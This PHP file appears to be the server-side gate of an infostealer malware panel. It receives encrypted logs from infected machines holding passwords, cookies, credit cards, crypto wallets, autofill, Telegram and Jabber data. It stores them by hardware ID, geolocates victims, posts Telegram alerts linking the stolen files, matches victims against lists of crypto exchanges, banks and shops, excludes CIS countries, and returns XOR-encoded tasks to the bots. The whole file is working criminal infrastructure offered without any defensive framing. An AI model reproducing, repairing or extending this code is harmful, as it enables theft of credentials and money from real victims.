<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
ini_set("allow_url_fopen", true);
ini_set("upload_max_filesize", "255M");
ini_set("post_max_size", "0");
ini_set("max_input_vars", "50000");
include 'database.php';
 require("functions.php");
$version = '3.0';
$xorKey="";
$outText='';
// Cloudflare support

if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}
if (isset($_SERVER["X-Forwarded-For"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["X-Forwarded-For"];
}
if (isset($_SERVER["X-Forwarded-IP"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["X-Forwarded-IP"];
}
if (isset($_SERVER["X-ProxyUser-Ip"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["X-ProxyUser-Ip"];
}
if (isset($_SERVER["X-Real-IP"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["X-Real-IP"];
}
	$db = mysqli_connect(host,login,pass,base);



function ipToCountry($ip)
{
    $info = file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip");
    $arr = json_decode($info, true);
    return $arr['geoplugin_countryCode'];
}

if(isset($_POST['logs'])){
	$logs = base64decrypt($_POST['logs']);
	$array = json_decode($logs, true);
		
	$key = base64decrypt($array['key']);
	$log = base64decrypt($array['log']);
	
	$zipa = TRAFFIC_DECRYPT($log, $key);
	$aaaaa = base64_encode($zipa);
		$zip = new ZipArchive();
		
		$zipname = 'logs.zip';
		$zip->open($zipname, ZipArchive::CREATE);
			$zip->addFromString('logs.zip', base64_decode($aaaaa));
		

		$dira = 'logs.zip';
	$dir = $_SERVER['DOCUMENT_ROOT'].'/'.$dira;
	
		if(move_uploaded_file($tmp,$dir))
		{
			
			$ip_info = file_get_contents('https://ip.nf/'.$ip.'.json');
			$json = json_decode($ip_info);
			
			$ip_info_ .= '<b>IP:</b> '.$json->ip->ip."<br>";
			$ip_info_ .= '<b>provider:</b> '.$json->ip->asn."<br>";
			$ip_info_ .= '<b>netmask:</b> '.$json->ip->netmask."<br>";
			$ip_info_ .= '<b>hostname:</b> '.$json->ip->hostname."<br>";
			$ip_info_ .= '<b>city:</b> '.$json->ip->city."<br>";
			$ip_info_ .= '<b>country:</b> '.$json->ip->country."<br>";
			$ip_info_ .= '<b>country_code:</b> '.$json->ip->country_code."<br>";
			$date = time();
	
			mysqli_query($db,$s);
		
		
			
		
			if ($res)
			{	
			
			
			
				$ip_info_ = str_replace('<br>',"\n",$ip_info_);
				$ip_info_ = str_replace('<b>','',$ip_info_);
				$ip_info_ = str_replace('</b>','',$ip_info_);
				
				$time = date('h:i:s');
				$info = "э НэД <b>абаИббаЛ аНаОаВбаЙ аЛаОаГ!</b>\n\nтЙяИ <b>ааАаНаНбаЕ IP:</b>\n\n <code>$ip_info_</code>";
				$content = array(
							'chat_id' => $chat_id,
							'text' => $info,
							'parse_mode'=>'HTML',
						);
				 file_get_contents($url."/sendmessage?".http_build_query($content));

				$url_log = 'https://'.$_SERVER['SERVER_NAME'].'/files/'.$file;
				$content = array(
							'chat_id' => $chat_id,
							'document'=>$url_log,
							'parse_mode'=>'HTML',
						);
				 file_get_contents($url."/sendDocument?".http_build_query($content));
				 
			}
		}
	}
$file = $dir;
$hwid = $array['hwid'];
$settings = $pdoConnection->query("SELECT * FROM `settings`")->fetch();
$currentLog = $pdoConnection->query("SELECT COUNT(*) FROM logs WHERE hwid = '" . $hwid . "'")->fetchColumn(0);
 $zip = new ZipArchive;
    $res = $zip->open($_SERVER['DOCUMENT_ROOT'].'/'.$dira);
    	$zip->extractTo("logs/" . $hwid);
			
    	$zip->extractTo("logs/" . $hwid);
				$zip->close();
				
if($settings[2]=='on'&&$currentLog>=0||$settings[2]=='off'&&$currentLog==0){
   
    if ($res === TRUE) {
		$count = $zip->numFiles;
		for ($i = 0; $i < $count; $i++)
		{
			$stat = $zip->statIndex ($i);
			if(stripos($stat['name'],".php")!==FALSE||stripos($stat['name'],".htm")!==FALSE||stripos($stat['name'],".asp")!==FALSE){
				deleteTmp($file);
				die();
			}
		}
        $os = strip_tags($_GET['os']);
        $cookie = $array['cookies'];
        $pswd =$array['passwords'];
        $version = '2.0';
        $cc = $array['cc'];
        $wallet = strip_tags($_GET['wallet']);
		$fileCount = strip_tags($_GET['file']);
        $autofill =$array['autofill'];
		$userid =1;
        $ip = $_SERVER["REMOTE_ADDR"];
        $date = time();
		$geolocationString = "IP : " . $ip . "\r\n";
		for ($crashes = 0; $crashes < 5; $crashes++) {
			try {
				$loc = json_decode(file_get_contents('http://ip-api.com/json/' . $ip), true);
				$country = $loc["country"];
				$countryCode = $loc['countryCode'];
				$geolocationString = $geolocationString . "Country Code : " . $loc['countryCode'] . "\r\n";
				$geolocationString = $geolocationString . "Country : " . $loc['country'] . "\r\n";
				$geolocationString = $geolocationString . "State Name : " . $loc['regionName'] . "\r\n";
				$geolocationString = $geolocationString . "City : " . $loc['city'] . "\r\n";
				$geolocationString = $geolocationString . "Timezone : " . $loc['timezone'] . "\r\n";
				$geolocationString = $geolocationString . "ZIP : " . $loc['zip'] . "\r\n";
				$geolocationString = $geolocationString . "ISP : " . $loc['isp'] . "\r\n";
				$geolocationString = $geolocationString . "Coordinates : " . $loc['lat'] . " , " . $loc['lon'] . "\r\n\r\n";
				break;
			}
			catch(Exception $e) {
				$country = "ERROR";
			}
		}
		if($country == "ERROR"){
			require_once("assets/GeoIP/geoip.php");
			$country = ip_name($ip);
			$countryCode= ip_code($ip);
			$geolocationString = $geolocationString . "Country Code : " . $countryCode . "\r\n";
			$geolocationString = $geolocationString . "Country : " . $country . "\r\n";
		}
        mkdir("logs/" . $hwid, 0777);
		if($settings[1]=="off"){
			if($countryCode=="RU"||$countryCode=="KZ"||$countryCode=="UA"||$countryCode=="BY"){
				if(!file_exists("logs/cislogs")){
					mkdir("logs/cislogs",0777);
				}
				mkdir("logs/cislogs/" . $hwid, 0777);
			
				die();
			}
		}
        $zip->extractTo("logs/" . $hwid);
		file_put_contents("logs/" . $hwid . "/" . ".htaccess","php_flag engine 0
			RemoveHandler .phtml .php .php2 .php3 .php4 .php5 .php7 .phps .cgi .pl .asp .aspx .shtml .shtm .fcgi .fpl .htm .html
			AddType text/plain .phtml .php .php2 .php3 .php4 .php5 .php6 .php7 .phps .cgi .pl .asp .aspx .shtml .shtm .fcgi .fpl .htm .html");
        $comment = $zip->getArchiveComment();
        $zip->close();
        $fd = fopen("logs/" . $hwid . "/" . "information.log", 'w');
        fwrite($fd, $comment);
        fclose($fd);
        $n = 2;

        $info = "logs/" . $hwid . "/" . "information.log";
        $f = file($info);
        array_splice($f, $n, 0, $geolocationString);
        file_put_contents($info, $f);
		
        $crypto = array('freewallet.org', 'paxful.com', 'capdax.com', 'wazirx.com', 'okex.com', 'bitfinex.com', 'hitbtc.com', 'kraken.com', 'gateio.io', 'bitstamp.net', 'bittrex.com', 'exmo', 'yobit', 'poloniex.com', 'bitflyer.jp', 'livecoin.net', 'wex.nz', 'cryptonator', 'mercatox.com', 'localbitcoins.com', 'localbitcoins.net', 'luno.', 'coinpayments', 'therocktrading.com', 'etherdelta.com', 'anxpro.com', 'c-cex.com', 'gatecoin.com', 'kiwi-coin.com', 'jubi.com', 'koineks.com', 'ecoin.cc', 'koinim.com', 'litebit.eu', 'lykke.com', 'mangr.com', 'localtrade.pro', 'lbank.info', 'leoxchange.com', 'liqui.io', 'kuna.io', 'fybse.se', 'freiexchange.com', 'fybsg.com', 'gatehub.net', 'getbtc.org', 'gemini.com', 'gdax.com', 'foxbit.com.br', 'foxbit.exchange', 'flowbtc.com.br', 'exx.com', 'exrates.me', 'excambriorex.com', 'ezbtc.ca', 'fargobase.com', 'fisco.co.uk', 'glidera.io', 'indacoin.com', 'ethexindia.com', 'indx.ru', 'infinitycoin.exchange', 'idex.su', 'idex.market', 'ice3x.com', 'ice3x.co.za', 'guldentrader.com', 'exchange.guldentrader.com', 'heatwallet.com', 'hypex.nl', 'negociecoins.com.br', 'topbtc.com', 'tidex.com', 'tidebit.com', 'tradesatoshi.com', 'urdubit.com', 'tuxexchange.com', 'tdax.com', 'spacebtc.com', 'surbitcoin.com', 'surbtc.com', 'usd-x.com', 'xbtce.com', 'yunbi.com', 'zyado.com', 'trade.z.com', 'zaif.jp', 'wavesplatform.com', 'walltime.info', 'vbtc.exchange', 'vaultoro.com', 'vircurex.com', 'virtacoinworld.com', 'vwlpro.com', 'nlexch.com', 'nevbit.com', 'nocks.com', 'novaexchange.com', 'nxtplatform.org', 'neraex.pro', 'mixcoins.com', 'mr-ripple.com', 'dsx.uk', 'nzbcx.com', 'okcoin.com', 'quadrigacx.com', 'quoinex.com', 'rightbtc.com', 'ripplefox.com', 'rippex.net', 'openledger.info', 'paymium.com', 'paribu.com', 'mercadobitcoin.com.br', 'dcexe.com', 'bitmex.com', 'bitmaszyna.pl', 'bitonic.nl', 'bitpanda.com', 'bitsblockchain.net', 'bitmarket.net', 'bitlish.com', 'bitfex.trade', 'bitexbook.com', 'bitex.la', 'bitflip.cc', 'bitgrail.com', 'bitkan.com', 'bitinka.com', 'bitholic.com', 'bitsane.com', 'changer.com', 'bitshares.org', 'btcmarkets.net', 'braziliex.com', 'btc-trade.com.ua', 'btc-alpha.com', 'bl3p.eu', 'bitssa.com', 'bitspark.io', 'bitso.com', 'bitstar.com', 'ittylicious.com', 'altcointrader.co.za', 'arenabitcoin', 'allcoin.com', 'abucoins.com', 'aidosmarket.com', 'aex.com', 'acx.com', 'bancor.network', 'bitbay.net', 'indodax.com', 'bitcointrade.com.br', 'bitcointoyou.com', 'bitbanktrade.jp', 'bitbank.com', 'big.one', 'bcex.ru', 'bitconnect.co', 'bisq.network', 'bit2c.co.il', 'bit-z.com', 'btcbear.com', 'btcbox.in', 'counterwallet.io', 'freewallet.io', 'indiesquare.me', 'rarepepewallet.com', 'coss.io', 'coolcoin.com', 'crex24.com', 'cryptex.net', 'coinut.com', 'coinsbank.com', 'coinsecure.in', 'coinsquare.com', 'coinsquare.io', 'coinspot.io', 'coinmarketcap.com', 'crypto-bridge.org', 'dcex.com', 'dabtc.com', 'decentrex.com', 'deribit.com', 'dgtmarket.com', 'cryptomkt.com', 'cryptoderivatives.market', 'cryptodao.com', 'cryptomate.co.uk', 'cryptox.pl', 'cryptopia.co.nz', 'coinroom.com', 'coinrate.net', 'chbtc.com', 'chilebit.net', 'coinbase.com', 'burst-coin.org', 'poloniex.com', 'btcc.', 'binance', 'btcc.net', 'btc-trade.com.ua', 'btctrade.im', 'btcturk.com', 'btcxindia.com', 'coincheck.com', 'coinmate.io', 'coingi.com', 'coinnest.co.kr', 'coinrail.co.kr', 'coinpit.io', 'coingather.com', 'coinfloor.co.uk', 'coinegg.com', 'coincorner.com', 'coinexchange.io', 'coinfalcon.com', 'digatrade.com', 'btc-alpha.com', 'blockchain', 'minergate', 'myetherwallet.com', 'litevault.net', 'dogechain.info', 'coinome', 'bitbns', 'btc.top', 'etherdelta.com', 'btcbank.com.ua', 'coindelta.com', 'depotwallet.com', 'kryptex.org');
        $game = array('steam', 'origin', 'ubi');
	    $money = array('paypal', 'chase.com', 'TD', 'wells', 'capitalone', 'skrill', 'PayU');
	    $shop = array('amazon', 'ebay', 'walmart', 'newegg', 'apple', 'bestbuy');

        $cookies = "logs/" . $hwid . "/" . "passwords.log";
		$taskListXOR  = "";
        $pdoConnection->exec("INSERT INTO `logs`(`id`, `userID`,`hwid`, `system`, `ip`, `country`, `date`, `count`, `cookie`, `pswd`, `buildversion`, `credit`, `autofill`, `wallets`, `comment`, `checked`) VALUES (null, '$userid','$hwid','$os','$ip','$country','$date', '$fileCount', '$cookie', '$pswd', '$version', '$cc', '$autofill', '$wallet','','0')");
		$tasks = $pdoConnection->query("SELECT * FROM `tasks` ORDER BY `id` LIMIT 10");
		while ($task = $tasks->fetch(PDO::FETCH_ASSOC)) {
            if ($task["count"] == 0) {
                $taskID = $task["id"];
				$typePreset = $task['preset'];
				if(checkTaskParams($hwid,$pswd,$cookie,$wallet,$cc,$task['params'])) continue;
				if($typePreset!=="all"){
				$b=0;
				$presetsArray = $pdoConnection->query("SELECT id,color,pattern,name FROM `presets` WHERE name='$typePreset'")->fetch();
				$siteFinded = explode(";",$presetsArray['pattern']);
				foreach($siteFinded as $key){
				if(file_exists("logs/" . $hwid . "/" . "passwords.log")) if (strripos(file_get_contents("logs/" . $hwid . "/" . "passwords.log"), $key)!==false) $b++;
				if(file_exists("logs/" . $hwid . "/" . "cookieDomains.log")) if (strripos(file_get_contents("logs/" . $hwid . "/" . "cookieDomains.log"), $key)!==false) $b++;
				}
				if($b==0) continue;
				}
                if ($task["country"] == "*") {
                    $taskListXOR  .= $task["task"]."~;~";
                } else {
                    $countries = explode(",", $task["country"]);

                    foreach ($countries as $_country) {
                        if ($_country == $loc['countryCode']) {
                            $taskListXOR  .=$task["task"]."~;~";
                        }
                    }
                }
            } else if ($task["count"] > $task["status"]) {
                $taskID = $task["id"];
				$typePreset = $task['preset'];
				if(checkTaskParams($hwid,$pswd,$cookie,$wallet,$cc,$task['params'])) continue;
				if($typePreset!=="all"){
				$b=0;
				$presetsArray = $pdoConnection->query("SELECT id,color,pattern,name FROM `presets` WHERE name='$typePreset'")->fetch();
				$siteFinded = explode("~;~",$presetsArray['pattern']);
				foreach($siteFinded as $key){
				if(file_exists("logs/" . $hwid . "/" . "passwords.log")) if (strripos(file_get_contents("logs/" . $hwid . "/" . "passwords.log"), $key)!==false) $b++;
				if(file_exists("logs/" . $hwid . "/" . "cookieDomains.log")) if (strripos(file_get_contents("logs/" . $hwid . "/" . "cookieDomains.log"), $key)!==false) $b++;
				}
				if($b==0) continue;
				}
                if ($task["country"] == "*") {
                    $pdoConnection->exec("UPDATE `tasks` SET `status`=`status` + 1 WHERE `id`='$taskID'");

                    $taskListXOR  .=$task["task"]."~;~";
                } else {
                    $countries = explode(",", $task["country"]);
                    foreach ($countries as $_country) {
                        if ($_country == $loc['countryCode']) {
                            $pdoConnection->exec("UPDATE `tasks` SET `status`=`status` + 1 WHERE `id`='$taskID'");

                            $taskListXOR  .=$task["task"]."~;~";
                        }
                    }
                }
            }
 
        }
		echo myxor($taskListXOR,$xorKey);
    } else {
		deleteTmp($file);
        die();
    }
}
deleteTmp($file);
function deleteTmp($file){
if(file_exists($file)) unlink($file);
if(file_exists('tmp/'.$_SERVER['REMOTE_ADDR'])) unlink('tmp/'.$_SERVER['REMOTE_ADDR']);
}
function checkTaskParams($hwid,$pswd,$cookie,$wallet,$cc,$params){
	$paramArray = explode(';',$params);
	$pass = $paramArray[0];
	$cookies=$paramArray[1];
	$wallets=$paramArray[2];
	$jabb=$paramArray[3];
	$tg=$paramArray[4];
	$ccParam=$paramArray[5];
	if($pass=="on"){
		if ($pswd==0) return true;
	}
	if($cookies=="on"){
		if ($cookie==0) return true;
	}
	if($wallets=="on"){
		if ($wallet==0) return true;
	}
	if($jabb=="on"){
		$fname = "logs/" . $hwid . "/jabber";
		if (!file_exists($fname)) return true;
	}
	if($tg=="on"){
		$fname = "logs/" . $hwid . "/Telegram";
		if (!file_exists($fname)) return true;
	}
	if($ccParam=="on"){
		if ($cc==0) return true;
	}
	return false;
}

function contains($string, Array $search, $caseInsensitive = false)
{
    $exp = '/'
        . implode('|', array_map('preg_quote', $search))
        . ($caseInsensitive ? '/i' : '/');
    return preg_match($exp, $string) ? true : false;
}

function formatString($param)
{
    $returnString = $param;
    $returnString = trim($returnString);
    $returnString = stripslashes($returnString);
    $returnString = htmlspecialchars($returnString);

    return $returnString;
}
function myxor($text, $key){
$outText='';
for($i=0;$i<strlen($text);) 
{
for($j=0;$j<strlen($key);$j++, $i++)
{
	$outText .= $text{$i} ^ $key{$j};
}
}
return $outText;
}
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

?>